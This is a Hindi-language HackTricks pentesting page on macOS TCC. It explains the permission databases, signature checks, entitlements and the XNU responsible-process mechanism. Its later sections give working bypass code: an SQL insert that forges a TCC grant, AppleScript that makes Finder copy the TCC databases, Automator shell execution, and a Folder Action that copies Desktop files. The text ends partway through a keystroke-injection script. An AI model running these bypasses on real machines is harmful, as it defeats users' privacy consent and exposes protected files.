# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **बुनियादी जानकारी**

**TCC (Transparency, Consent, and Control)** एक security protocol है, जो application permissions को नियंत्रित करने पर केंद्रित है। इसकी मुख्य भूमिका **location services, contacts, photos, microphone, camera, accessibility और full disk access** जैसी संवेदनशील सुविधाओं की सुरक्षा करना है। इन सुविधाओं तक app की पहुँच देने से पहले उपयोगकर्ता की स्पष्ट सहमति अनिवार्य करके, TCC गोपनीयता और उपयोगकर्ताओं का अपने data पर नियंत्रण बेहतर बनाता है।

जब applications संरक्षित सुविधाओं तक पहुँच माँगती हैं, तो उपयोगकर्ताओं को TCC दिखाई देता है। यह एक prompt के रूप में दिखता है, जिसमें उपयोगकर्ता **पहुँच की अनुमति दे या उसे अस्वीकार कर सकते हैं**। इसके अलावा, TCC उपयोगकर्ता की सीधी कार्रवाइयों को भी स्वीकार करता है, जैसे **files को किसी application में drag और drop करना**, जिससे विशिष्ट files तक पहुँच दी जा सके। इससे यह सुनिश्चित होता है कि applications को केवल उन्हीं चीज़ों तक पहुँच मिले, जिनकी स्पष्ट अनुमति दी गई है।

![TCC prompt का एक उदाहरण](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** को `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` में स्थित **daemon** संभालता है और इसे `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` में configure किया गया है (यह mach service `com.apple.tccd.system` register करता है)।

हर logged-in user के लिए एक **user-mode tccd** चलता है। इसे `/System/Library/LaunchAgents/com.apple.tccd.plist` में define किया गया है और यह mach services `com.apple.tccd` और `com.apple.usernotifications.delegate.com.apple.tccd` register करता है।

यहाँ आप tccd को system और user, दोनों के रूप में चलते हुए देख सकते हैं:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Permissions **parent** application से **inherit** होती हैं और **permissions** को **Bundle ID** तथा **Developer ID** के आधार पर **track** किया जाता है।

### TCC Databases

अनुमतियां/अस्वीकृतियां कुछ TCC databases में store होती हैं:

- system-wide database **`/Library/Application Support/com.apple.TCC/TCC.db`** में।
  - यह database **SIP protected** है, इसलिए इसमें केवल SIP bypass के ज़रिए ही लिखा जा सकता है।
- per-user preferences के लिए user TCC database **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**।
  - यह database protected है, इसलिए केवल Full Disk Access जैसे उच्च TCC privileges वाली processes ही इसमें लिख सकती हैं (लेकिन यह SIP द्वारा protected नहीं है)।

> [!WARNING]
> पिछले databases **read access के लिए भी TCC protected** हैं। इसलिए आप अपने सामान्य user TCC database को तब तक **नहीं पढ़ पाएंगे**, जब तक वह किसी TCC privileged process से न हो।
>
> हालांकि, याद रखें कि इन उच्च privileges वाली process (जैसे **FDA** या **`kTCCServiceEndpointSecurityClient`**) से users TCC database में लिखा जा सकता है।

- **तीसरा** TCC database **`/var/db/locationd/clients.plist`** में है, जो **location services access** करने की अनुमति वाले clients को दर्शाता है।
- **`/Library/Application Support/com.apple.TCC/REG.db`** में registered TCC database paths दर्ज होते हैं। यदि planted user database registered नहीं है, तो उसे अस्वीकार किया जा सकता है; केवल इस path को जानने से किसी भी database का access नहीं मिलता।<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** में managed Privacy Preferences Policy Control (PPPC) decisions होते हैं। जब किसी app को managed grant मिला हो, लेकिन वह सामान्य `access` rows में मौजूद न हो, तो इसे जांचें।<sup>[[7]](#references)</sup>
- SIP-protected file **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (लेकिन कोई भी इसे पढ़ सकता है) उन applications की allow list है जिन्हें TCC exception की आवश्यकता होती है।

> [!TIP]
> **iOS** में TCC database **`/private/var/mobile/Library/TCC/TCC.db`** में होता है।

> [!TIP]
> **notification center UI** **system TCC database में बदलाव** कर सकता है:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> हालांकि, उपयोगकर्ता **`tccutil`** command line utility से **नियम रीसेट** कर सकते हैं; इसमें कोई documented query operation नहीं है।<sup>[[4]](#references)</sup>

#### Databases को क्वेरी करें

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> दोनों databases की जाँच करके आप देख सकते हैं कि किसी app ने किन permissions की अनुमति दी है, किन्हें प्रतिबंधित किया है, या किन permissions के लिए वह पूछेगा।

- **`service`** TCC **permission** का string representation है
- **`client`** वह **bundle ID** या **binary का path** है जिसे permissions मिली हैं
- **`client_type`** बताता है कि यह Bundle Identifier(0) है या absolute path(1)

<details>

<summary>यदि यह absolute path है, तो इसे कैसे execute करें</summary>

बस **`launctl load you_bin.plist`** चलाएँ, ऐसी plist के साथ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** के अलग-अलग मान हो सकते हैं: denied(0), unknown(1), allowed(2), या limited(3)।
- **`auth_reason`** के निम्नलिखित मान हो सकते हैं: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** फ़ील्ड यह बताने के लिए है कि निष्पादित की जाने वाली binary को कैसे verify करना है और TCC permissions कैसे देनी हैं:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- तालिका के **अन्य फ़ील्ड** के बारे में अधिक जानकारी के लिए [**यह ब्लॉग पोस्ट देखें**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)।<sup>[[1]](#references)</sup>

आप `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` में ऐप्स को **पहले से दी गई अनुमतियाँ** भी देख सकते हैं।

> [!TIP]
> उपयोगकर्ता **`tccutil`** का उपयोग करके नियमों को **रीसेट** कर सकते हैं, लेकिन grants की जाँच करने के लिए उन्हें databases का निरीक्षण करना होगा।<sup>[[4]](#references)</sup>

#### TCC अनुमतियाँ रीसेट करें

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Apple Events sender और target grants की पहचान करें

Automation grant **sender-to-target** निर्णय होता है, हर app को नियंत्रित करने की अनुमति नहीं। User database तक पहुँच होने पर, नीचे दिए गए [Apple Events](macos-apple-events.md) या Finder workflows आज़माने से पहले allowed sender/target pairs की सूची बनाएँ। `csreq` sender की पहचान करता है और `indirect_object_code_identity` target की; ऊपर दी गई `csreq` method से किसी भी non-null blob को decode करें।<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC Signature Checks

TCC **डेटाबेस** एप्लिकेशन का **Bundle ID** स्टोर करता है, लेकिन यह **यह सुनिश्चित करने के लिए** **जानकारी** भी **स्टोर** करता है कि permission का उपयोग करने की अनुमति मांगने वाला App सही है।

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> इसलिए, समान नाम और bundle ID का उपयोग करने वाले अन्य एप्लिकेशन, दूसरे ऐप्स को दी गई अनुमतियों तक पहुँच नहीं पाएँगे।

### Entitlements और TCC अनुमतियाँ

TCC grant, **App Sandbox** restrictions को override नहीं करता। Sandboxed camera client को `com.apple.security.device.camera` की आवश्यकता होती है; Apple Hardened Runtime apps के लिए भी यह capability उपलब्ध कराता है। इनमें से कोई भी entitlement, अलग से आने वाले user consent prompt को bypass नहीं करता। हर unsandboxed process के लिए sandbox entitlement को अनिवार्य शर्त न मानें। कोई request विफल होने पर executable के entitlements और responsible app—दोनों की जाँच करें।<sup>[[8]](#references)[[9]](#references)</sup>

ध्यान दें कि entitlements plist files होते हैं और code sig का हिस्सा होते हैं। इन्हें code sig में special slots के ज़रिए आगे hash किया जाता है और kernel code द्वारा kernel में या user-mode code द्वारा `csops(#169)` या `csops_audittoken(#170)` का उपयोग करके query किया जा सकता है।

हालाँकि, `~/Desktop`, `~/Downloads` और `~/Documents` जैसे **कुछ user folders तक पहुँचने** के लिए apps को किसी विशेष **entitlements की आवश्यकता नहीं होती।** सिस्टम transparently access संभालेगा और ज़रूरत पड़ने पर **user से prompt करेगा**।

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple के apps **prompts नहीं दिखाएँगे**। उनकी **entitlements** list में **पहले से granted rights** होते हैं, यानी वे **कभी popup नहीं दिखाएँगे**, और **TCC databases** में भी दिखाई नहीं देंगे। उदाहरण के लिए:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

इससे Calendar reminders, calendar और address book तक पहुँचने के लिए उपयोगकर्ता से पूछने से बचेगा।

> [!TIP]
> entitlements के बारे में कुछ आधिकारिक दस्तावेज़ों के अलावा, entitlements के बारे में अनौपचारिक **दिलचस्प जानकारी भी** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) पर मिल सकती है।

कुछ TCC permissions हैं: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... ऐसी सभी permissions को परिभाषित करने वाली कोई सार्वजनिक सूची नहीं है, लेकिन आप यह [**ज्ञात permissions की सूची**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) देख सकते हैं।<sup>[[1]](#references)</sup>

### संवेदनशील, असुरक्षित स्थान

- $HOME (स्वयं)
- $HOME/.ssh, $HOME/.aws, आदि
- /tmp

### User Intent / com.apple.macl

जैसा कि पहले बताया गया है, **किसी फ़ाइल को App पर drag\&drop करके उसे उस फ़ाइल तक पहुँच देना** संभव है। यह पहुँच किसी TCC database में निर्दिष्ट नहीं होगी, बल्कि फ़ाइल के **extended attribute** के रूप में होगी। यह attribute अनुमति प्राप्त App का **UUID संग्रहीत करेगा**:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> यह दिलचस्प है कि **`com.apple.macl`** attribute का प्रबंधन tccd नहीं, बल्कि **Sandbox** करता है।
>
> यह भी ध्यान दें कि अगर आप ऐसी फ़ाइल को, जो आपके कंप्यूटर पर किसी app के UUID को अनुमति देती है, किसी दूसरे कंप्यूटर पर ले जाते हैं, तो उस app को access नहीं मिलेगा, क्योंकि उसी app के UID अलग होंगे।

अन्य extended attributes की तरह extended attribute `com.apple.macl` को **clear नहीं किया जा सकता**, क्योंकि यह **SIP द्वारा protected** है। हालाँकि, [**इस पोस्ट में बताया गया है**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/) कि फ़ाइल को **zip** करके, उसे **delete** करके और फिर **unzip** करके इसे disable किया जा सकता है।<sup>[[3]](#references)</sup>






## XNU Responsible Process Mechanism

macOS/iOS में **responsible process** mechanism एक अहम security feature है, जिसका उपयोग **TCC (Transparency, Consent, and Control)** framework और अन्य security systems यह पता लगाने के लिए करते हैं कि child processes की chain के बावजूद किसी action के लिए अंततः कौन-सा process ज़िम्मेदार है।

जब TCC permissions (जैसे camera, microphone, location) की जाँच करता है, तो वह हमेशा request करने वाले तत्काल process की जाँच नहीं करता। इसके बजाय, वह **responsible process** की जाँच करता है—आमतौर पर उस GUI application की, जिसने action शुरू किया था, भले ही वास्तविक request किसी helper process या daemon से आई हो।

किसी request से वास्तव में संबद्ध app की पहचान करने के लिए, protected operation शुरू करते समय TCC के `AttributionChain` messages stream करें। सिर्फ़ इसलिए helper executable को grant देने से यह अधिक भरोसेमंद है कि उसने API call की थी। रिपोर्ट की गई identity की तुलना संबंधित `access` row में bundle ID या path और signing requirement से करें।<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Responsible Process कैसे सेट होता है</summary>

### प्रक्रिया संरचना के फ़ील्ड

XNU में प्रत्येक process दो प्रमुख UUID identifiers बनाए रखता है:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: प्रक्रिया का अपना UUID (उसके Mach-O binary के `LC_UUID` load command से)
- **`p_responsible_pid`**: ज़िम्मेदार प्रक्रिया का PID
- **`p_responsible_uuid`**: ज़िम्मेदार प्रक्रिया का UUID (उस प्रक्रिया के समाप्त होने के बाद भी बना रहता है)

### ज़िम्मेदार प्रक्रिया कैसे सेट होती है

1. **प्रक्रिया निर्माण के दौरान (Fork)**

जब `fork()` या `posix_spawn()` के ज़रिए कोई नई प्रक्रिया बनाई जाती है, तो ज़िम्मेदार प्रक्रिया parent से inherit होती है (`exec()` syscall मौजूदा `proc` structure का फिर से उपयोग करता है, इसलिए वहाँ यह चरण दोहराया नहीं जाता):

**स्थान**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**मुख्य बिंदु:**
- Child processes, parent के `p_responsible_pid` को **inherit** करते हैं
- इससे process hierarchy में **जवाबदेही की एक श्रृंखला** बनती है
- Responsible process आमतौर पर मूल GUI application की ओर संकेत करता है

2. **मुख्य Function: `proc_set_responsible_pid()`**

**स्थान**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**यह function क्या करता है:**
1. Target process में **responsible PID सेट करता है**
2. `proc_find()` का उपयोग करके **responsible process ढूँढता है** (reference count बढ़ाता है)
3. Responsible process के `p_uuid` से UUID को target process के `p_responsible_uuid` में **कॉपी करता है**
4. `proc_rele()` से **reference रिलीज़ करता है** (reference count घटाता है)

3. **PID और UUID दोनों क्यों स्टोर करें?**

दोनों को स्टोर करने का तरीका एक महत्वपूर्ण समस्या हल करता है:

| Field | Purpose | Problem | Solution |
|-------|---------|---------|----------|
| `p_responsible_pid` | मौजूदा process को जल्दी ढूँढना | Process के बाहर निकलने के बाद PID दोबारा इस्तेमाल हो सकता है | Active process lookup के लिए उपयोग किया जाता है |
| `p_responsible_uuid` | स्थायी पहचान | Process के समाप्त होने के बाद भी बना रहता है | Security checks और auditing के लिए उपयोग किया जाता है |

**समस्या**: अगर child process से पहले responsible process बाहर निकल जाए, तो PID को recycle करके किसी बिल्कुल अलग process को दिया जा सकता है।

**समाधान**: UUID immutable होता है और उस specific binary की विशिष्ट पहचान करता है जो responsible थी—उसके बाहर निकलने के बाद भी।

### Process Creation Flow

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### UUID स्रोत: LC_UUID Load Command

`p_uuid` में संग्रहीत UUID **Mach-O executable के `LC_UUID` load command** से आता है:

1. **Compilation का समय**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **निष्पादन समय**

**स्थान**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **प्रोसेस स्ट्रक्चर में संग्रहीत**

**स्थान**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**स्थान**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### TCC में प्रविष्टि

अगर किसी समय आपको TCC database पर write access मिल जाए, तो entry जोड़ने के लिए आप नीचे दिए गए जैसा कुछ इस्तेमाल कर सकते हैं (comments हटा दें):

<details>

<summary>TCC में प्रविष्टि का उदाहरण</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

अगर आप कुछ TCC permissions वाली किसी app में घुसने में कामयाब हो गए हैं, तो उनका दुरुपयोग करने के लिए TCC payloads वाला अगला पेज देखें:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Events के बारे में यहां जानें:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA*

Automation permission का TCC नाम है: **`kTCCServiceAppleEvents`**\
यह विशिष्ट TCC permission, TCC database में **उस application को भी दर्शाती है जिसे manage किया जा सकता है** (इसलिए permissions से हर चीज़ को manage करने की अनुमति नहीं मिलती)।

**Finder** एक ऐसा application है जिसके पास **हमेशा FDA होता है** (भले ही यह UI में दिखाई न दे), इसलिए अगर आपके पास इस पर **Automation** privileges हैं, तो आप इसके privileges का दुरुपयोग करके **इससे कुछ actions करवा सकते हैं**।\
इस मामले में, आपकी app को **`com.apple.Finder`** पर **`kTCCServiceAppleEvents`** permission की ज़रूरत होगी।<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

रिपोर्ट किए गए write variant में, जब Finder तक Automation path उपलब्ध हो, Finder से उपयोगकर्ता की `com.apple.TCC` directory का **नाम बदलवाया** जाता है। फिर बदले हुए path के तहत मौजूद database को staging directory में copy किया गया, वहाँ modify किया गया, वापस copy किया गया और directory का नाम पहले जैसा कर दिया गया। नई `kTCCServiceAppleEvents` row में **भेजने वाले binary और Finder, दोनों** की पहचान होनी चाहिए, जिसमें उनकी code requirements भी शामिल हों; target identity के बिना sender को grant देना इसके बराबर नहीं है। यह path-dependent technique है, इसलिए यह न मानें कि सिर्फ Finder Automation से arbitrary database writes की अनुमति मिल जाती है; इसे target macOS release पर verify करें।<sup>[[11]](#references)</sup>

> [!WARNING]
> इस permission के साथ आप **Finder से TCC-restricted folders को access करने और आपको उनकी files देने के लिए कह** सकेंगे, लेकिन afaik आप **Finder से arbitrary code execute नहीं करवा सकेंगे**, ताकि उसके FDA access का पूरा दुरुपयोग किया जा सके।
>
> इसलिए, आप FDA की सभी क्षमताओं का दुरुपयोग नहीं कर सकेंगे।

यह Finder पर Automation privileges पाने का TCC prompt है:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> ध्यान दें कि **Automator** app के पास TCC permission **`kTCCServiceAppleEvents`** है, इसलिए यह Finder जैसे **किसी भी app को control कर सकता है**। इसलिए, Automator को control करने की permission होने पर आप नीचे दिए गए code से **Finder** को भी control कर सकते हैं:

<details>

<summary>Automator के अंदर shell प्राप्त करें</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

**Script Editor app के साथ भी ऐसा ही होता है,** यह Finder को नियंत्रित कर सकता है, लेकिन AppleScript का उपयोग करके आप इसे कोई script चलाने के लिए बाध्य नहीं कर सकते।

### कुछ TCC तक Automation (SE)

**System Events Folder Actions बना सकता है, और Folder actions कुछ TCC folders (Desktop, Documents और Downloads) तक पहुँच सकते हैं**, इसलिए इस व्यवहार का दुरुपयोग करने के लिए निम्नलिखित जैसी script का उपयोग किया जा सकता है:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** से FDA\*

**`System Events`** पर Automation + Accessibility (**`kTCCServicePostEvent`**) processes को **keystrokes भेजने** की अनुमति देता है। इस तरह आप Finder का दुरुपयोग करके users की TCC.db बदल सकते हैं या किसी भी app को FDA दे सकते हैं (हालाँकि इसके लिए password माँगा जा सकता है)।

Finder द्वारा users की TCC.db overwrite करने का उदाहरण:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
